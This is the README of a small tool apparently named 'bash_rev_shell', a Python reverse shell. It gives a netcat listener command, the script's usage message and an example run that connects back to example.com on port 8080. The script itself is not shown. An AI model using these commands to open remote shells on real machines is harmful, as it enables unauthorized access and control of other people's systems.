# bash_rev_shell
Simple reverse shell in python

# Usage

First run listener on machine where you want to access revers shell.
for example:
```
nc -l -p 8080 -vvv -k
```

```
./rev_shell.py

Err: Something went wrong. Did you check usage ?
USAGE: ./rev_shell.py <ip_or_fqdn> <port_number>
 ```
 
 # Example:
 ```
 ./rev_shell.py example.com 8080
```
